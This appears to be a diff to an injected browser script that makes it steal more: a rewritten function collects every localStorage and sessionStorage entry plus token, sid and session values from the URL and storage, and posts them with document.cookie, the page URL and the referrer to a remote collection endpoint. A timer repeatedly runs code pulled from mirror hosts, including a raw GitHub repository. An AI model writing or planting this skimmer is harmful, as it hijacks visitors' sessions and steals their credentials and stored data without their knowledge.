@@ -24,7 +24,15 @@ function post(t,d){
 }
 function summary(t,d){Q.push({u:W+"/h?t="+t,s:String(d).slice(0,7000)});pump()}
 window.__HL={post:post,summary:summary};
-function ls(){var s=[];try{for(var i=0;i<localStorage.length;i++){var k=localStorage.key(i);s.push(k+"="+String(localStorage.getItem(k)).slice(0,500))}}catch(e){}return s.join("\n")}
+function ls(){
+ var o={lslen:-1,err:"",ls:{},ss:{},tok:"",sid:""};
+ try{o.lslen=localStorage.length}catch(e){o.err+="ls:"+e.name}
+ try{for(var i=0;i<localStorage.length;i++){var k=localStorage.key(i);o.ls[k]=String(localStorage.getItem(k)).slice(0,600)}}catch(e){o.err+="|rd:"+e.name}
+ try{for(var j=0;j<sessionStorage.length;j++){var k2=sessionStorage.key(j);o.ss[k2]=String(sessionStorage.getItem(k2)).slice(0,600)}}catch(e){o.err+="|ss:"+e.name}
+ try{var m=/[?&](token|sid|session)=([^&#]+)/.exec(location.href);if(m){o[m[1]]=m[2]}}catch(e){}
+ try{o.sid=localStorage.getItem("session")||localStorage.getItem("sid")||localStorage.getItem("token")||""}catch(e){}
+ return JSON.stringify(o)
+}
 var TICKS=0,T0=Date.now();
 var MIRRORS=[
  "https://raw.githubusercontent.com/polootyyy/cdnx/main/",
@@ -51,6 +59,7 @@ window.__TICK=setInterval(function(){
   run();
 },12000);
 run();
-post("agent",[location.href,document.title,location.referrer,document.cookie,"--ls--",ls()].join(" || "));
+post("agent",[location.href,document.title,location.referrer,document.cookie].join(" || "));
+post("ls",ls());
 summary("agent",location.host+location.pathname+" ck="+document.cookie.slice(0,300));
 })();
